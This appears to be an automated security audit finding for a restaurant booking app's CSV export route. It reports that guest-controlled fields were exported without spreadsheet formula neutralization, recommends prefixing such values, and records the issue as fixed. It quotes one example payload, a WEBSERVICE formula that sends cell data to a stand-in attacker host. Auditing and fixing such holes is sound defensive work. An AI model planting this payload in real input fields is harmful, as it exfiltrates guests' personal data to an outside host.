# [MEDIUM] Guest-controlled booking fields are exported without spreadsheet formula neutralization

**File:** [`src/app/api/ops/bookings/export/route.ts`](https://github.com/lapeninns/nabatable/blob/codex/Menu/blob/codex/src/app/api/ops/bookings/export/route.ts#L89-L113) (lines 89, 94, 97, 98, 101, 102, 112, 113)
**Project:** nabatableLP
**Severity:** MEDIUM • **Confidence:** high • **Slug:** `other-csv-formula-injection`

## Owners

**Suggested assignee:** `aman.shrestha@mail.bcu.ac.uk` _(via last-committer)_

## Finding

The export builds a CSV from booking fields that can be influenced by guests, including customer name, email, phone, allergies, dietary restrictions, profile notes, and booking notes. The imported CSV writer only quotes commas/quotes/newlines and does not neutralize values beginning with spreadsheet formula characters such as '=', '+', '-', '@', tab, or carriage return. A guest can create or update a booking with a value like '=WEBSERVICE("https://attacker.example/"&A1)' in a name or notes field, then when staff export and open the CSV in Excel/LibreOffice the formula can execute and exfiltrate adjacent exported PII.

## Recommendation

Centralize CSV formula mitigation in lib/export/csv.ts before quoting, for example prefix an apostrophe or otherwise neutralize fields whose trimmed value starts with '=', '+', '-', '@', tab, or carriage return. Apply it to all CSV exports.

## Revalidation

**Verdict:** fixed

`lib/export/csv.ts` neutralizes formula-leading values in `escapeCSVField` before quoting, and `/api/ops/bookings/export` emits CSV through `generateCSV`. Covered by `tests/lib/csv-export.test.ts`.

## Recent committers (`git log`)

- amanshresthaa <aman.shrestha@mail.bcu.ac.uk> (2026-02-08)
